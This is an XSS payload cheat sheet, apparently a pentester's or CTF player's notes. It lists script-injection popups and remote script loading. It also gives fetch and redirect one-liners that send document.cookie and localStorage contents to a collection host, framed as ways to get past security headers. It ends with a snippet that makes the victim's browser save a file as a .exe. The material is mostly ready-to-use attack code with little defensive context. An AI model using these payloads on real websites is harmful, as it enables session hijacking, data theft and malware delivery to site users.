## Python server

`python3 -m http.server [PORT]`
`python2 -m SimpleHTTPServer [PORT]`
# Basic JavaScript popups
`<script>alert(0)</script>`
`<img src='x' onerror='alert(0)'>`
`<iframe src="javascript:alert(0)"></iframe>`
# Obtain a script from remote host - useful if there is a character limit
`<script src='http://127.0.0.1'></script>`
# Useful JavaScript to interact with specific in-page elements
`document.getElementsByTagName("Tag-name-here")`
`document.getElementsbyId("Id-here")`
`document.getElementsByClassName("Class-name-here")`
`document.getElementsByName("Name-here")`
`document.getElementsByTagNameNS("Tag-in-namespace-here")`
# Performing a get request to a third-party service
`fetch("http://127.0.0.1")`

Extracting cookies:
`fetch("http://127.0.0.1?x="+document.cookie)`

Ensuring the content is treated as a sting:
`fetch("http://127.0.0.1?x="+JSON.stringify(document.cookie))`

Encoding content which has characters that can mess with things:
`fetch("http://127.0.0.1?x="+encodeURIComponent(JSON.stringify(document.cookie)))`

In event that certain security headers are applied, the fetch method may no longer work. Instead, the below could be used to force a redirect.
`window.location.href = "http://127.0.0.1?x="+JSON.stringify(document.cookie)`  
`window.location.replace("http://127.0.0.1?x="+JSON.stringify(document.cookie))`

# Odds N' Ends

Timeout function in case in-page elements load at different times
`<img src='x' onerror=setTimeout(function(){fetch("http://127.0.0.1"))}, 5000);'>`

Accessing local storage
`encodeURIComponent(JSON.stringify(localStorage))`

Self-contained payload to download a file blob as a .exe
`function saveBlob(blob, fileName) { var a = document.createElement("a"); document.body.appendChild(a); a.style = "display: none"; var url = window.URL.createObjectURL(blob); a.href = url; a.download = fileName; a.click(); window.URL.revokeObjectURL(url); }; saveBlob(new Blob(["examplePayloadhere"], { type: 'text/plain' }), 'test.exe');`
